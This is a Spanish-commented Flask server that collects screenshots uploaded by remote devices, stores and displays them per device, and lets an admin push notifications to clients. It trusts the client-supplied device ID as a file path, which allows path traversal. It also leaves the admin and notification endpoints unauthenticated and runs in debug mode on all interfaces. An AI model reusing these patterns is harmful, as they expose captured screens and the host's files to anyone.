from flask import Flask, request, jsonify, send_from_directory, render_template
import os
from datetime import datetime
from flask_cors import CORS
from config.settings import SERVER_URL, UPLOAD_FOLDER

app = Flask(__name__, template_folder="templates", static_folder="static")
CORS(app)

# Diccionario para almacenar capturas organizadas por usuario
user_captures = {}

# Diccionario para almacenar notificaciones asignadas a cada usuario
notifications = {}

@app.route("/upload", methods=["POST"])
def upload_screenshot():
    if "file" not in request.files:
        return jsonify({"error": "No se encontró el archivo"}), 400

    file = request.files["file"]
    # Se espera que el cliente envíe el identificador en "device_id"
    device_id = request.form.get("device_id", "unknown")

    device_folder = os.path.join(UPLOAD_FOLDER, device_id)
    os.makedirs(device_folder, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"
    file_path = os.path.join(device_folder, filename)
    file.save(file_path)

    relative_path = os.path.join(device_id, filename)
    if device_id not in user_captures:
        user_captures[device_id] = []
    user_captures[device_id].append(relative_path)

    return jsonify({"message": "Captura recibida", "file_path": relative_path}), 200

@app.route("/captures/<user>", methods=["GET"])
def get_captures(user):
    if user not in user_captures:
        return jsonify({"error": "No hay imágenes para este usuario"}), 404
    return jsonify({"user": user, "captures": user_captures[user]})

@app.route("/view/<path:filename>", methods=["GET"])
def view_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route("/user/<username>")
def user_page(username):
    if username not in user_captures:
        return f"Usuario {username} no encontrado", 404
    return render_template("user.html", user=username, captures=user_captures[username], server_url=SERVER_URL)

# Nuevo endpoint para que el administrador envíe notificaciones
@app.route("/send_notification", methods=["POST"])
def send_notification():
    # Recibimos los datos del formulario (o vía JSON)
    user = request.form.get("user")
    message = request.form.get("message")
    if not user or not message:
        return jsonify({"error": "Faltan datos: se requieren 'user' y 'message'"}), 400

    notifications[user] = message
    return jsonify({"message": f"Notificación enviada a {user}."}), 200

# Nuevo endpoint para que el cliente (notifier) consulte la notificación asignada
@app.route("/notifications", methods=["GET"])
def get_notification():
    user = request.args.get("user")
    notif = notifications.get(user)
    # Puedes decidir si una vez leída la notificación se borra o se mantiene
    return jsonify({"notification": notif})

# Ruta para mostrar el panel de administración (para enviar notificaciones)
@app.route("/admin")
def admin_panel():
    return render_template("admin_panel.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
